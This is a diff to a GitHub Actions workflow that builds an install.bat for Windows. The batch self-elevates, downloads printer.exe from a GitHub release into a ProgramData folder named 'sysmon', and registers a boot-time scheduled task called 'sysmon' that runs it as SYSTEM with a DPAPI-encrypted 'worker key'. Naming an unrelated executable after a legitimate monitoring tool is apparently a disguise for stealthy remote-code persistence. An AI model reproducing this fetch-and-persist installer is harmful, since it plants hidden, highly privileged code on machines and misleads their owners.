@@ -57,25 +57,23 @@ jobs:
           GITHUB_TOKEN: ${{ secrets.GH_TOKEN || secrets.GITHUB_TOKEN }}
         run: |
           $k = $env:WORKER_KEY
-          if ([string]::IsNullOrWhiteSpace($k)) { $k = "<YOUR_WORKER_KEY>" }
-          $k = $k -replace '\s+', ''
-          $dpapiCmd = 'for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "Add-Type -AssemblyName System.Security; $e=[System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes(''' + $k + '''),$null,[System.Security.Cryptography.DataProtectionScope]::LocalMachine); ''DPAPI:'' + [Convert]::ToBase64String($e)"`) do set "dpapi=%%A"'
+          $k = if ([string]::IsNullOrWhiteSpace($k)) { "" } else { $k -replace '\s+', '' }
           @(
             '@echo off',
             'net session >nul 2>&1',
             'if %errorlevel% neq 0 (',
-            '  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList ''/c \"\"%~f0\"\"'' -Verb RunAs"',
+            '  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList ''/c \"\"%~f0\"\" %*'' -Verb RunAs"',
             '  exit /b',
             ')',
             'cd /d "%~dp0"',
+            'set "k=%~1"',
+            'if not defined k if defined WORKER_KEY set "k=%WORKER_KEY%"',
+            if ($k) { 'if not defined k set "k=' + $k + '"' } else { 'if not defined k for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "$s = Read-Host ''Worker Key'' -AsSecureString; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($s))"`) do set "k=%%A"' },
+            'if not defined k exit /b 1',
             'set "d=%ProgramData%\sysmon"',
             'if not exist "%d%" mkdir "%d%"',
-            'if not exist "%~dp0printer.exe" (',
-            '  powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; Invoke-WebRequest -Uri ''https://github.com/sabbirba/preconnect/releases/latest/download/printer.exe'' -OutFile ''%d%\printer.exe'' -UseBasicParsing"',
-            ') else (',
-            '  copy /y "%~dp0printer.exe" "%d%\printer.exe" >nul',
-            ')',
-            $dpapiCmd,
+            'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; Invoke-WebRequest -Uri ''https://github.com/sabbirba/preconnect/releases/latest/download/printer.exe'' -OutFile ''%d%\printer.exe'' -UseBasicParsing"',
+            'for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "Add-Type -AssemblyName System.Security; $e=[System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes(''%k%''),$null,[System.Security.Cryptography.DataProtectionScope]::LocalMachine); ''DPAPI:'' + [Convert]::ToBase64String($e)"`) do set "dpapi=%%A"',
             'schtasks /Create /TN "sysmon" /TR "\"%d%\printer.exe\" \"%dpapi%\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul',
             'schtasks /Run /TN "sysmon" >nul'
           ) | Set-Content -Path "install.bat" -Encoding ASCII
